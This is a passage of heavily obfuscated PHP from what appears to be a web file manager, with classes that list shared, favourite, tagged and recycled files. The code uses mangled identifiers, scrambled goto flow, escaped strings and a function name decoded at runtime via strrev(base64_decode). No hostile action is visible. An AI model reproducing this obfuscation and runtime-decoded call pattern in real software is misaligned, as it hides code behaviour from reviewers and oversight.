$this->field($B­ùñõ‹Äâ[28])->where($B§©Ü»ô”Ä)->select(); goto e„¹ê¹ĞøŒ; e„¹ê¹ĞøŒ: $fˆ†…ô‚¼¿ = array_to_keyvalue($fˆ†…ô‚¼¿, $B­ùñõ‹Äâ[33], $B­ùñõ‹Äâ[28]); if (!$fˆ†…ô‚¼¿ || !in_array($A¯‚‡ÃâÎ„, $fˆ†…ô‚¼¿)) { return $A¯‚‡ÃâÎ„; } for ($a†÷Ã®” = 0; $a†÷Ã®” < count($fˆ†…ô‚¼¿); $a†÷Ã®”++) { if (!in_array($A¯‚‡ÃâÎ„ . "\50{$a†÷Ã®”}\x29", $fˆ†…ô‚¼¿)) { return $A¯‚‡ÃâÎ„ . "\50{$a†÷Ã®”}\51"; } } goto C÷˜¨Ÿ”Š; AĞ¾ğôÄèª: } } goto Eôë®î»¢; B‚ƒ†Ø¬Ä: class PathDriverDbShareItem extends PathDriverDB { public function __construct($F”Š½÷ß¶) { $this->pathParse = $F”Š½÷ß¶; $this->model = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1154]); } public function getPathOuter($bÄîŸÕ‘¶) { $c†Ä…Ì•ºò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$bÄîŸÕ‘¶) { return $bÄîŸÕ‘¶; } $b×»‰µ×ª‚ = $this->parse($bÄîŸÕ‘¶); return trim(KodIO::makeShare($this->pathParse[$c†Ä…Ì•ºò[385]], $b×»‰µ×ª‚[$c†Ä…Ì•ºò[385]]), $c†Ä…Ì•ºò[8]); } protected function infoParse($fÅóòÙ¼‘ğ, $CÒ‹è‘–ˆ¼ = false, $Dµ¯‰íïŠ‚ = false) { $C—ïÒ±¯æİ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B·’³“Ó¨ç = $this->pathParse[$C—ïÒ±¯æİ[385]]; $aŞ«¶Ëùµ² = trim($this->pathParse[$C—ïÒ±¯æİ[1015]], $C—ïÒ±¯æİ[8]); return Action($C—ïÒ±¯æİ[1161])->sharePathInfo($B·’³“Ó¨ç, $aŞ«¶Ëùµ²); } public function infoFull($E†–êŠàª) { $DÅ¨Ó§Ëåæ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d–ìøñÜö• = explode($DÅ¨Ó§Ëåæ[8], trim($E†–êŠàª, $DÅ¨Ó§Ëåæ[8])); if (count($d–ìøñÜö•) > 1) { $b«ƒËßºš = implode($DÅ¨Ó§Ëåæ[8], array_splice($d–ìøñÜö•, 1)); $a–Ø¨Å‚¼Ğ = $this->model->pathInfoByPath($d–ìøñÜö•[0], $b«ƒËßºš); if (!$a–Ø¨Å‚¼Ğ) { return !1; } $this->pathParse[$DÅ¨Ó§Ëåæ[1015]] = $a–Ø¨Å‚¼Ğ[$DÅ¨Ó§Ëåæ[387]]; } return $this->infoParse($E†–êŠàª); } public function listAll($AÅÒ‡–¤õÎ) { goto aãçß‹ƒç; Eö’•†Ë†â: $c‡“êùöô¥ = $this->model->listAll($AÅÒ‡–¤õÎ); $aÖÓ ±£ = Model($däª”³ï¡ª[552])->getInfo($döğ±ö»õø[$däª”³ï¡ª[457]]); $BŠš ÄÏÆ¯ = Action($däª”³ï¡ª[1161]); goto FÉ…ÖØê‘; aãçß‹ƒç: $däª”³ï¡ª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $döğ±ö»õø = IO::info($this->pathParse[$däª”³ï¡ª[75]]); if (!$döğ±ö»õø) { return array(); } goto Eö’•†Ë†â; FÉ…ÖØê‘: foreach ($c‡“êùöô¥ as &$f±¨ºÏÍÇã) { check_abort(); $f±¨ºÏÍÇã[$däª”³ï¡ª[84]] = $BŠš ÄÏÆ¯->_shareItemeParse($f±¨ºÏÍÇã[$däª”³ï¡ª[84]], $aÖÓ ±£); } unset($f±¨ºÏÍÇã); return $c‡“êùöô¥; goto Càæ£‰ïøò; Càæ£‰ïøò: } } $BïÌÕõ˜Ò = $_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1162]]; $fãÀÊ¤‹¾¸ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1163]; goto F¾ëîì»Ä“; c…×ñÖĞŸë: $b‡´¯Á» = strrev(base64_decode($_SERVER[¼–Ç][0])); function binCheckNeq($E©ãé‘® ‰, $Aå„Åç´†) { return $E©ãé‘® ‰ != $Aå„Åç´†; } $_SERVER[$_SERVER[¼–Ç][1]] = $b‡´¯Á»($_SERVER[$_SERVER[¼–Ç][2]]); goto DÖã‚‡Ïàğ; cØ‘˜Âß§Œ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\145"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\x65" => "\151\157\137\x73\x6f\x75\162\143\145\x5f\155\145\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\163\x6f\x75\162\x63\145\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\163\x65\x72\x74", "\146\165\156\143\164\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\x65\x54\x69\155\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\x76\x69\145\167\124\x69\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\165\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Aõµ±º¸) { return $this->listSource(array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][386] => $Aõµ±º¸)); } public function typeName($a‡¶†œŠá») { static $f•ÙĞ˜å‰ = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $f•ÙĞ˜å‰[$a‡¶†œŠá» . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33]]; } public function sourceListInfo($eæÖÊâ©Ã, $cæ‡Ş«´ºÆ = false) { goto Aï¶×‡Â§ ; AëàÏµÖ™: return array_to_keyvalue($f…¨×©•ë¢, $aÃª„ƒÉ„²[387]); goto f†‚³Ë»Ú‘; Aï¶×‡Â§ : $aÃª„ƒÉ„² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eæÖÊâ©Ã = $eæÖÊâ©Ã ? $eæÖÊâ©Ã : array(); $eæÖÊâ©Ã = array_filter(array_unique($eæÖÊâ©Ã)); goto eŠÜÖíªˆ†; eŠÜÖíªˆ†: if (!$eæÖÊâ©Ã) { return array(); } $f…¨×©•ë¢ = $this->where(array($aÃª„ƒÉ„²[387] => array($aÃª„ƒÉ„²[7], $eæÖÊâ©Ã)))->select(); $this->_listDataApply($f…¨×©•ë¢, $cæ‡Ş«´ºÆ); goto AëàÏµÖ™; f†‚³Ë»Ú‘: } public function pathInfoFilter($eæˆ„é‚ë¹) { goto aŒâŸ¦¡Ä; Bà¬¶”¹Œñ: $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[389]] = $this->typeName($eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[389]]); if ($eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[388]] != 1) { $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[167]] = $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[390]]; unset($eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[390]]); } $d›å«¥’öò = $dŸÈÃ»ÜÄ¸[391]; goto b¤Âë™Õµ´; aŒâŸ¦¡Ä: $dŸÈÃ»ÜÄ¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[75]] = KodIO::make($eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[387]]); $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[29]] = $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[388]] == 1 ? $dŸÈÃ»ÜÄ¸[76] : $dŸÈÃ»ÜÄ¸[173]; goto Bà¬¶”¹Œñ; b¤Âë™Õµ´: $d›å«¥’öò .= $dŸÈÃ»ÜÄ¸[392]; $d›å«¥’öò .= $dŸÈÃ»ÜÄ¸[393]; $aÃ™‡¤Ôõš = explode($dŸÈÃ»ÜÄ¸[47], $d›å«¥’öò); goto b“Ú† ‹½Î; b“Ú† ‹½Î: if (isset($eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[394]]) && $eæˆ„é‚ë¹[$dŸÈÃ»ÜÄ¸[394]][$dŸÈÃ»ÜÄ¸[395]] == -1) { $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[192]); $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[83]); $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[396]); $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[397]); $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[77]); $aÃ™‡¤Ôõš = array_remove_value($aÃ™‡¤Ôõš, $dŸÈÃ»ÜÄ¸[398]); } $eæˆ„é‚ë¹ = array_field_key($eæˆ„é‚ë¹, $aÃ™‡¤Ôõš); return $eæˆ„é‚ë¹; goto B¼³°–¾Íâ; B¼³°–¾Íâ: } public function listUserFav() { goto eŒÁ³˜×Ù›; a‘ÓËÛ½…: foreach ($b§Ü‡Ä”óÉ as &$f‚§›ŠÔ›) { $f‚§›ŠÔ› = array($fŸ¥Á–Ñƒ[403] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[385]], $fŸ¥Á–Ñƒ[404] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[28]], $fŸ¥Á–Ñƒ[405] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[75]], $fŸ¥Á–Ñƒ[406] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[29]], $fŸ¥Á–Ñƒ[407] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[192]], $fŸ¥Á–Ñƒ[408] => $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[83]]); if ($f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[29]] == $fŸ¥Á–Ñƒ[400] && $Dªçê¸é…[$f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[75]]]) { $f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[84]] = $Dªçê¸é…[$f‚§›ŠÔ›[$fŸ¥Á–Ñƒ[75]]]; } } unset($f‚§›ŠÔ›); return $b§Ü‡Ä”óÉ; goto CáÉ£¤¸Ï£; BĞÇÁÇ¼: $cÒåÜ¦ = array_to_keyvalue($cÒåÜ¦, $fŸ¥Á–Ñƒ[33], $fŸ¥Á–Ñƒ[75]); if ($cÒåÜ¦) { $Dªçê¸é… = $this->listSource(array($fŸ¥Á–Ñƒ[401] => array($fŸ¥Á–Ñƒ[402], $cÒåÜ¦))); } $Dªçê¸é… = array_to_keyvalue($Dªçê¸é…[$fŸ¥Á–Ñƒ[363]], $fŸ¥Á–Ñƒ[387]); goto a‘ÓËÛ½…; eŒÁ³˜×Ù›: $fŸ¥Á–Ñƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b§Ü‡Ä”óÉ = Model($fŸ¥Á–Ñƒ[399])->listData(); $cÒåÜ¦ = array_filter_by_field($b§Ü‡Ä”óÉ, $fŸ¥Á–Ñƒ[29], $fŸ¥Á–Ñƒ[400]); goto BĞÇÁÇ¼; CáÉ£¤¸Ï£: } public function listUserTag($eè£×êÓ›è) { goto EŠ÷…¸òë; DÇÄò‡é£Î: $fæ÷ÆîŸß = array_to_keyvalue($bÈÎ§¨‡ÎŒ[$bë±”‡ğÜ‰[73]], $bë±”‡ğÜ‰[33], $bë±”‡ğÜ‰[387]); $C‚„„¥´£ë = array_merge($fæ÷ÆîŸß, $bìæÔ±´§é); foreach ($Cºò§Úø†Œ as $fÃ¼·æ³™») { if (!in_array($fÃ¼·æ³™», $C‚„„¥´£ë)) { $B¾áç¦Òœ[] = $fÃ¼·æ³™»; } } goto d¦¿®¿æÏ×; d¦¿®¿æÏ×: if ($B¾áç¦Òœ) { Model($bë±”‡ğÜ‰[411])->removeBySource($B¾áç¦Òœ); } return $bÈÎ§¨‡ÎŒ; goto BÅ²„Ï™ƒ›; fÊ÷Ü ±é±: $a²™Ú¶µÂì = array(); foreach ($fäÈ®Ì´ as $b•Õä–¬°ò) { $fÃ¼·æ³™» = $b•Õä–¬°ò[$bë±”‡ğÜ‰[75]]; if (!$fÃ¼·æ³™») { continue; } if (!isset($a²™Ú¶µÂì[$fÃ¼·æ³™»])) { $a²™Ú¶µÂì[$fÃ¼·æ³™»] = array(); } $a²™Ú¶µÂì[$fÃ¼·æ³™»][] = $b•Õä–¬°ò[$bë±”‡ğÜ‰[410]]; } $Cºò§Úø†Œ = array(); goto Aä±ÚÖµ·ß; b¨©Ìİ•ç»: if (!$bÈÎ§¨‡ÎŒ || count($Cºò§Úø†Œ) == $bÈÎ§¨‡ÎŒ[$bë±”‡ğÜ‰[360]][$bë±”‡ğÜ‰[361]]) { return $bÈÎ§¨‡ÎŒ; } $B¾áç¦Òœ = array(); $bìæÔ±´§é = array_to_keyvalue($bÈÎ§¨‡ÎŒ[$bë±”‡ğÜ‰[74]], $bë±”‡ğÜ‰[33], $bë±”‡ğÜ‰[387]); goto DÇÄò‡é£Î; EŠ÷…¸òë: $bë±”‡ğÜ‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($eè£×êÓ›è && !is_array($eè£×êÓ›è)) { $eè£×êÓ›è = array($eè£×êÓ›è); } $fäÈ®Ì´ = Model($bë±”‡ğÜ‰[409])->listData(); goto fÊ÷Ü ±é±; Aä±ÚÖµ·ß: foreach ($a²™Ú¶µÂì as $AÕ¯»“–ÍÉ => $F·‡Í»ßåÂ) { $Cáçò¯„¥‚ = !0; if (!$eè£×êÓ›è) { $Cºò§Úø†Œ[] = $AÕ¯»“–ÍÉ; continue; } foreach ($eè£×êÓ›è as $D«â‡Ş—”) { if (!in_array($D«â‡Ş—”, $F·‡Í»ßåÂ)) { $Cáçò¯„¥‚ = !1; break; } } if ($Cáçò¯„¥‚) { $Cºò§Úø†Œ[] = $AÕ¯»“–ÍÉ; } } if (!$Cºò§Úø†Œ) { return array(); } $bÈÎ§¨‡ÎŒ = $this->listSource(array($bë±”‡ğÜ‰[401] => array($bë±”‡ğÜ‰[402], $Cºò§Úø†Œ))); goto b¨©Ìİ•ç»; BÅ²„Ï™ƒ›: } public function listUserRecycle() { $c†¯¿¿ÌÒ‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b×¹Ë­¬Ùõ = Model($c†¯¿¿ÌÒ‚[412])->listData(); if (!$b×¹Ë­¬Ùõ) { return array(); } $C…•¡†É­¸ = array($c†¯¿¿ÌÒ‚[401] => array($c†¯¿¿ÌÒ‚[402], $b×¹Ë­¬Ùõ), $c†¯¿¿ÌÒ‚[413] => 1); return $this->listSource($C…•¡†É­¸); } public function listSource($dìÁ¾ŠÍ, $dØË’¤·¢¦ = 3000) { goto EØË¨§Éå; d¬ §äÈ‚: return $E‚­óÂÆÃ; goto cîßàê™Õ¬; EØË¨§Éå: $A¡×Ù”ù×° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($dìÁ¾ŠÍ[$A¡×Ù”ù×°[414]])) { $dìÁ¾ŠÍ[$A¡×Ù”ù×°[414]] = 0; } $CÒÉ×õ‚±¹ = $A¡×Ù”ù×°[415]; goto AŸ¬¸êº´×; AŸ¬¸êº´×: $E‚­óÂÆÃ = $this->field($CÒÉ×õ‚±¹)->_makeOrder()->where($dìÁ¾ŠÍ)->selectPage($dØË’¤·¢¦); $this->_listDataApply($E‚­óÂÆÃ[$A¡×Ù”ù×°[363]]); $this->_listMake($E‚­óÂÆÃ); goto d¬ §äÈ‚; cîßàê™Õ¬: } protected function _makeOrder() { goto E¤…ÏÒÃâ; E¤…ÏÒÃâ: $A™´éŠîä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bœˆ—×ÖŞ© = Model($A™´éŠîä[416])->get($A™´éŠîä[417]); $dšé’Ïø  = Model($A™´éŠîä[416])->get($A™´éŠîä[418]); goto böï—¤™¼–; böï—¤™¼–: $c¶ñ”ÕŠÂÓ = array($A™´éŠîä[419] => $A™´éŠîä[420], $A™´éŠîä[421] => $A™´éŠîä[422]); $FÍí©ä½™ = array($A™´éŠîä[28] => $A™´éŠîä[28], $A™´éŠîä[77] => $A™´éŠîä[77], $A™´éŠîä[167] => $A™´éŠîä[390], $A™´éŠîä[396] => $A™´éŠîä[396], $A™´éŠîä[423] => $A™´éŠîä[397], $A™´éŠîä[192] => $A™´éŠîä[192], $A™´éŠîä[83] => $A™´éŠîä[83]); $f©•œ˜™“Œ = Input::get($A™´éŠîä[424], $A™´éŠîä[7], $Bœˆ—×ÖŞ©, array_keys($FÍí©ä½™)); goto b¹£½Ï×•; b¹£½Ï×•: $eÖøÇ´Èˆò = Input::get($A™´éŠîä[425], $A™´éŠîä[7], $dšé’Ïø , array_keys($c¶ñ”ÕŠÂÓ)); if (!in_array($f©•œ˜™“Œ, array_keys($FÍí©ä½™))) { $f©•œ˜™“Œ = $A™´éŠîä[28]; } if (!in_array($eÖøÇ´Èˆò, array_keys($c¶ñ”ÕŠÂÓ))) { $f©•œ˜™“Œ = $A™´éŠîä[419]; } goto FÏ°¾Ä’¹; FÏ°¾Ä’¹: if ($f©•œ˜™“Œ == $A™´éŠîä[28]) { } $B¨¥É«¾¡Õ = $A™´éŠîä[426] . $FÍí©ä½™[$f©•œ˜™“Œ] . $A™´éŠîä[50] . $c¶ñ”ÕŠÂÓ[$eÖøÇ´Èˆò]; return $this->order(rtrim(trim($B¨¥É«¾¡Õ), $A™´éŠîä[47])); goto D¡ˆºÎŒ“í; D¡ˆºÎŒ“í: } protected function _listDataApplyItem($eØïãøØºÂ, $DøÃƒ“Çîö = false) { $FñÑÍ¾Öß… = array($eØïãøØºÂ); $this->_listDataApply($FñÑÍ¾Öß…, $DøÃƒ“Çîö); return $FñÑÍ¾Öß…[0]; } protected function _listDataApply(&$cŒ÷é·ÏÄö, $a†Ã™¸³ù = false) { goto EºˆÔö’±; EºˆÔö’±: $aØÂª›Èç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$cŒ÷é·ÏÄö) { $cŒ÷é·ÏÄö = array(); return; } $dÌêÄà¹£Ê = array_to_keyvalue($cŒ÷é·ÏÄö, $aØÂª›Èç[33], $aØÂª›Èç[387]); goto f‘ñ¨’¨Ô; f‘ñ¨’¨Ô: $dÌêÄà¹£Ê = array_unique($dÌêÄà¹£Ê); $this->_listSourceCache($cŒ÷é·ÏÄö); if (!$a†Ã™¸³ù) { $this->_listAppendMeta($cŒ÷é·ÏÄö, $dÌêÄà¹£Ê); $this->_listAppendFileMeta($cŒ÷é·ÏÄö, $dÌêÄà¹£Ê); $this->_listAppendChildren($cŒ÷é·ÏÄö, $dÌêÄà¹£Ê); } goto B¥óÉë¶ÙÎ; dŸ°‹»·’Ä: $this->_listAppendUser($cŒ÷é·ÏÄö); $this->_listFilterInfo($cŒ÷é·ÏÄö, $a†Ã™¸³ù); goto B´—¢¼»; B¥óÉë¶ÙÎ: $this->_listAppendPath($cŒ÷é·ÏÄö); $this->_listAppendAuth($cŒ÷é·ÏÄö); $this->_listAppendSourceInfo($cŒ÷é·ÏÄö, $dÌêÄà¹£Ê); goto dŸ°‹»·’Ä; B´—¢¼»: } protected function _listSourceCache($aàŸèã‘) { $Eà”õèŒ¢² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($aàŸèã‘ as $d‡Ã²˜•è¹) { self::$cacheSourceInfo[$Eà”õèŒ¢²[427] . $d‡Ã²˜•è¹[$Eà”õèŒ¢²[387]]] = $d‡Ã²˜•è¹; } } protected function _listFilterInfo(&$BŠ‚œ×°•, $fÑ®ŠÃƒì = false) { $AáªÕ×í÷‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($BŠ‚œ×°• as &$AƒØŠ¡Ô„) { $AƒØŠ¡Ô„ = $this->pathInfoFilter($AƒØŠ¡Ô„); self::$cachePathInfo[$AáªÕ×í÷‘[428] . intval($fÑ®ŠÃƒì) . $AáªÕ×í÷‘[429] . $AƒØŠ¡Ô„[$AáªÕ×í÷‘[387]]] = $AƒØŠ¡Ô„; } unset($AƒØŠ¡Ô„); } protected function _listMake(&$C­›ùô²) { $Bƒ×ƒÈº¯Š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C­›ùô²[$Bƒ×ƒÈº¯Š[74]] = array(); $C­›ùô²[$Bƒ×ƒÈº¯Š[73]] = array(); foreach ($C­›ùô²[$Bƒ×ƒÈº¯Š[363]] as $f¹˜›) { $e«ä½ÀÎ‰ = $f¹˜›[$Bƒ×ƒÈº¯Š[388]] == 1 ? $Bƒ×ƒÈº¯Š[74] : $Bƒ×ƒÈº¯Š[73]; $C­›ùô²[$e«ä½ÀÎ‰][] = $f¹˜›; } unset($C­›ùô²[$Bƒ×ƒÈº¯Š[363]]); } protected function _listAppendMeta(&$aáÂ×ÑÕÂ—, $bÕõ÷å®‘è) { goto BÒóˆ¥ïã“; D‹‰Ò¦çå‡: foreach ($D®‹šç˜Ÿ³ as $bÃ£êˆ¬ñ“) { if (!isset($E´Õì†¹¦[$bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[387]]])) { $E´Õì†¹¦[$bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[387]]] = array(); } if (in_array($bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[92]], $f†ßœƒ…³)) { continue; } $E´Õì†¹¦[$bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[387]]][$bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[92]]] = $bÃ£êˆ¬ñ“[$CéœÈ‹òÉÑ[368]]; } foreach ($aáÂ×ÑÕÂ— as &$EŸÔí¥°ì›) { $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[434]] = !1; if (isset($E´Õì†¹¦[$EŸÔí¥°ì›[$CéœÈ‹òÉÑ[387]]])) { $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[434]] = $E´Õì†¹¦[$EŸÔí¥°ì›[$CéœÈ‹òÉÑ[387]]]; } if ($this->fileIsLock($EŸÔí¥°ì›) && $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[394]]) { $f¯ŠÁ¥È±… = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[394]][$CéœÈ‹òÉÑ[395]] = AuthModel::authDisable($EŸÔí¥°ì›[$CéœÈ‹òÉÑ[394]][$CéœÈ‹òÉÑ[395]], $f¯ŠÁ¥È±…); $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[394]][$CéœÈ‹òÉÑ[435]][$CéœÈ‹òÉÑ[394]] = $EŸÔí¥°ì›[$CéœÈ‹òÉÑ[394]][$CéœÈ‹òÉÑ[395]]; } } unset($EŸÔí¥°ì›); goto DÀ¤ëêù¯œ; C¹„¡Åë­Ø: if (!$D®‹šç˜Ÿ³) { return; } $f†ßœƒ…³ = array($CéœÈ‹òÉÑ[432], $CéœÈ‹òÉÑ[433]); $E´Õì†¹¦ = array(); goto D‹‰Ò¦çå‡; BÒóˆ¥ïã“: $CéœÈ‹òÉÑ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e©ô‹É×Ö² = array($CéœÈ‹òÉÑ[401] => array($CéœÈ‹òÉÑ[402], $bÕõ÷å®‘è)); $D®‹šç˜Ÿ³ = Model($CéœÈ‹òÉÑ[430])->field($CéœÈ‹òÉÑ[431])->where($e©ô‹É×Ö²)->select(); goto C¹„¡Åë­Ø; DÀ¤ëêù¯œ: } protected function _listAppendFileMeta(&$DÅ¬Å©²¬Ã, $Aô˜è‘©¹µ) { goto EàÜ‘×Ö¥¶; eÜÛœ—”’Ş: $e©ÈÈÆìêª = $e©ÈÈÆìêª ? $e©ÈÈÆìêª : array(); $eõ¶ŸÏæâ = array(); foreach ($e©ÈÈÆìêª as $c°¶÷Ô¹Ï¼) { if (!isset($eõ¶ŸÏæâ[$c°¶÷Ô¹Ï¼[$D§…ÑÎç¬ã[436]]])) { $eõ¶ŸÏæâ[$c°¶÷Ô¹Ï¼[$D§…ÑÎç¬ã[436]]] = array(); } $eõ¶ŸÏæâ[$c°¶÷Ô¹Ï¼[$D§…ÑÎç¬ã[436]]][$c°¶÷Ô¹Ï¼[$D§…ÑÎç¬ã[92]]] = $c°¶÷Ô¹Ï¼[$D§…ÑÎç¬ã[368]]; } goto FçŠ…˜æ’Ê; EàÜ‘×Ö¥¶: $D§…ÑÎç¬ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B”ŠÀ¿®”Ä = array_to_keyvalue($DÅ¬Å©²¬Ã, $D§…ÑÎç¬ã[33], $D§…ÑÎç¬ã[436]); $B”ŠÀ¿®”Ä = array_filter(array_unique($B”ŠÀ¿®”Ä)); goto B”¥Á¾Öëµ; FçŠ…˜æ’Ê: foreach ($DÅ¬Å©²¬Ã as &$aÆ²°„™ƒ) { goto a†ëóŸñ•å; f½¥£È¸¼: if (isset($aÆ²°„™ƒ[$D§…ÑÎç¬ã[163]][$D§…ÑÎç¬ã[162]])) { $aÆ²°„™ƒ[$D§…ÑÎç¬ã[162]] = json_decode($aÆ²°„™ƒ[$D§…ÑÎç¬ã[163]][$D§…ÑÎç¬ã[162]], !0); unset($aÆ²°„™ƒ[$D§…ÑÎç¬ã[163]][$D§…ÑÎç¬ã[162]]); } goto AÛä·²ò†İ; A³‹ŠâŠ®: unset($A£Ü‡ƒğ÷¶[$AŸš—İ•òù][$D§…ÑÎç¬ã[75]]); $C°Ş©ÃËì = is_array($eõ¶ŸÏæâ[$AŸš—İ•òù]) ? $eõ¶ŸÏæâ[$AŸš—İ•òù] : array(); $aÆ²°„™ƒ[$D§…ÑÎç¬ã[163]] = array_merge($C°Ş©ÃËì, $A£Ü‡ƒğ÷¶[$AŸš—İ•òù]); goto f½¥£È¸¼; a†ëóŸñ•å: $AŸš—İ•òù = $aÆ²°„™ƒ[$D§…ÑÎç¬ã[436]]; if (!$AŸš—İ•òù || !isset($A£Ü‡ƒğ÷¶[$AŸš—İ•òù])) { continue; } $fš‹äì™­ = $A£Ü‡ƒğ÷¶[$AŸš—İ•òù]; goto D¢„‹µÚï•; D¢„‹µÚï•: $fš‹äì™­[$D§…ÑÎç¬ã[77]] = $aÆ²°„™ƒ[$D§…ÑÎç¬ã[77]]; $fš‹äì™­[$D§…ÑÎç¬ã[28]] = $aÆ²°„™ƒ[$D§…ÑÎç¬ã[28]]; if (!isset(self::$cacheFileInfo[$D§…ÑÎç¬ã[442] . $AŸš—İ•òù])) { self::$cacheFileInfo[$D§…ÑÎç¬ã[442] . $AŸš—İ•òù] = array_merge(array(), $fš‹äì™­); } goto A³‹ŠâŠ®; AÛä·²ò†İ: } unset($aÆ²°„™ƒ); goto fêÍõ´•†Ç; B‚ç’Çš…: $A£Ü‡ƒğ÷¶ = Model($D§…ÑÎç¬ã[439])->field($EĞéÜ®ùâ)->where($cÑ»è¥›‰÷)->select(); $A£Ü‡ƒğ÷¶ = array_to_keyvalue($A£Ü‡ƒğ÷¶, $D§…ÑÎç¬ã[436]); $e©ÈÈÆìêª = Model($D§…ÑÎç¬ã[440])->field($D§…ÑÎç¬ã[441])->where($cÑ»è¥›‰÷)->select(); goto eÜÛœ—”’Ş; B”¥Á¾Öëµ: if (!$B”ŠÀ¿®”Ä) { return; } $cÑ»è¥›‰÷ = array($D§…ÑÎç¬ã[437] => array($D§…ÑÎç¬ã[402], $B”ŠÀ¿®”Ä)); $EĞéÜ®ùâ = $D§…ÑÎç¬ã[438]; goto B‚ç’Çš…; fêÍõ´•†Ç: } protected function _listAppendSourceInfo(&$bèáŸÍê¥, $BŸ‰Ñ¦åÄ°) { goto D÷òõŒÀ´’; Bº§ˆ‘ „°: $F‰ùÌ™ëƒ = array_to_keyvalue($aËŒ¤‚îÏñ, $fîøîÍĞ‘ï[385]); $E§°Œœ«¥ = array_to_keyvalue_group($CÔéùÄŸæ¥, $fîøîÍĞ‘ï[75], $fîøîÍĞ‘ï[410]); $A£•ƒ‚æ¢ˆ = array_to_keyvalue($eÈøŠó»èø, $fîøîÍĞ‘ï[75]); goto CÊÌª¯›×©; cÛÙ¬Ôø¹: return $bèáŸÍê¥; goto c˜Õ‚Í“Ïö; D÷òõŒÀ´’: $fîøîÍĞ‘ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($fîøîÍĞ‘ï[443])) { return; } $aËŒ¤‚îÏñ = Model($fîøîÍĞ‘ï[444])->listData(); goto dŠÁÀË§’‹; dŠÁÀË§’‹: $CÔéùÄŸæ¥ = Model($fîøîÍĞ‘ï[409])->listData(); $eÈøŠó»èø = Model($fîøîÍĞ‘ï[399])->listData(); $F°·† ØÁ¬ = Model($fîøîÍĞ‘ï[445])->listSimple(); goto Bº§ˆ‘ „°; CÊÌª¯›×©: 